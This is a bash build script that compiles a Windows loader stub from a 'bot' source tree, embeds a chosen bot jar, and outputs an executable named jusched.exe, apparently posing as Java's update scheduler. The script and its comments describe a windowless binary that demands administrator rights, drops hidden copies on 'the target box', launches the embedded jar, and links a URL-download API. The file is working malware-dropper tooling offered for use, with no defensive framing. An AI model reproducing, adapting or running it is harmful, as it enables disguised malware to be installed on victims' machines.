#!/usr/bin/env bash
# build_exe.sh — wrap a (your own / encrypted / signed) jar into the
# jusched.exe bootstrap loader.
#
#   ./build_exe.sh <your-jar.jar> [out.exe]
#
# Build flow:
#   1. compile the loader stub (bot/cpp/loader/loader.cpp) with mingw
#   2. append your jar bytes to the stub
#   3. append a 16-byte footer: magic + jar_len + 0 + 0
#
# Output: a single self-contained .exe that carries your jar inside it.
# At run-time the exe unpacks your jar, drops hidden copies, and launches
# javaw -jar <your jar> — so any jar you hand it (custom, encrypted, signed)
# is what actually runs on the target box.
set -e

HERE="$(cd "$(dirname "$0")" && pwd)"
DIST="$HERE/dist"
SRC_LOADER="$HERE/bot/cpp/loader/loader.cpp"
RC_FILE="$HERE/bot/cpp/core/app.rc"

RED=$'\e[1;31m'; GRN=$'\e[1;32m'; YEL=$'\e[1;33m'; CYN=$'\e[1;36m'; OFF=$'\e[0m'
have() { command -v "$1" >/dev/null 2>&1; }

usage() {
    cat <<EOF
usage: $(basename "$0") <jar-to-embed> [out.exe]

  - jar-to-embed: any .jar file (your custom/encrypted/signed one)
  - out.exe      : output path (default: dist/jusched_custom.exe)

Example:
  ./build_exe.sh /path/to/your-encrypted-bot.jar
  ./build_exe.sh /path/to/your.jar /tmp/custom-bot.exe
EOF
}

if [ $# -lt 1 ]; then
    usage
    exit 1
fi

JAR="$1"
OUT="${2:-$DIST/jusched_custom.exe}"

if [ ! -f "$JAR" ]; then
    echo "${RED}jar not found: $JAR${OFF}"
    exit 1
fi
JAR="$(cd "$(dirname "$JAR")" && pwd)/$(basename "$JAR")"

mkdir -p "$DIST"

# 1. Find a mingw cross-compiler (prefer posix model — needed for std::thread
#    inside loader.cpp; the win32 model won't link it).
MINGW=""
if have x86_64-w64-mingw32-g++-posix; then
    MINGW="x86_64-w64-mingw32-g++-posix"
elif have x86_64-w64-mingw32-g++; then
    MINGW="x86_64-w64-mingw32-g++"
    echo "${YEL}win32 mingw — may fail on std::thread. Install: sudo apt install -y g++-mingw-w64-x86-64-posix${OFF}"
fi
if [ -z "$MINGW" ]; then
    echo "${RED}no mingw cross-compiler found.${OFF}"
    echo "  install: sudo apt-get install -y g++-mingw-w64-x86-64-posix"
    exit 1
fi

# 2. Compile the UAC manifest resource (requireAdministrator) if windres is
#    present. The exe triggers the elevation prompt on double-click.
RCOBJ=""
WRES=""
if have x86_64-w64-mingw32-windres; then WRES="x86_64-w64-mingw32-windres"
elif have windres; then WRES="windres"; fi
if [ -n "$WRES" ] && [ -f "$RC_FILE" ]; then
    RCOBJ="$DIST/loader_manifest.o"
    ( cd "$(dirname "$RC_FILE")" && "$WRES" "$(basename "$RC_FILE")" -O coff -o "$RCOBJ" ) \
      || RCOBJ=""
fi

# 3. Compile the loader stub (-mwindows = no console, GUI subsystem).
#    -lurlmon is required for URLDownloadToFileA; #pragma comment does nothing
#    on mingw.
STUB="$DIST/loader_stub.tmp.exe"
echo "${CYN}[loader] building stub with $MINGW ...${OFF}"
"$MINGW" -std=c++17 -O2 -Os -s -static -mwindows \
    -D_WIN32_WINNT=0x0601 -D_UNICODE -DUNICODE \
    -o "$STUB" "$SRC_LOADER" $RCOBJ \
    -lshell32 -lole32 -lurlmon -static-libgcc -static-libstdc++
[ -n "$RCOBJ" ] && rm -f "$RCOBJ"

# 4. Assemble: [stub][your jar][footer magic+jar_len+0+0]
JARLEN=$(stat -c%s "$JAR" 2>/dev/null || wc -c < "$JAR")
echo "${CYN}[embed] appending $(basename "$JAR") (${JARLEN} bytes)${OFF}"
cat "$STUB" "$JAR" > "$OUT"
rm -f "$STUB"
{
    # magic 0x4A435244 little-endian: 44 52 43 4A
    printf '\x44\x52\x43\x4A'
    # jar_len u32 little-endian
    printf "$(printf '\\x%02x\\x%02x\\x%02x\\x%02x' \
        "$((JARLEN & 0xFF))" "$(((JARLEN >> 8) & 0xFF))" \
        "$(((JARLEN >> 16) & 0xFF))" "$(((JARLEN >> 24) & 0xFF))")"
    # 8 zero pad bytes
    printf '\x00\x00\x00\x00\x00\x00\x00\x00'
} >> "$OUT"

SIZE=$(stat -c%s "$OUT" 2>/dev/null || wc -c < "$OUT")
echo "${GRN}built: ${OUT} (${SIZE} bytes, embedding $(basename "$JAR"))${OFF}"
echo "${GRN}run:   ${OUT}   (asks for admin, self-embeds jar, drops hidden copies)${OFF}"
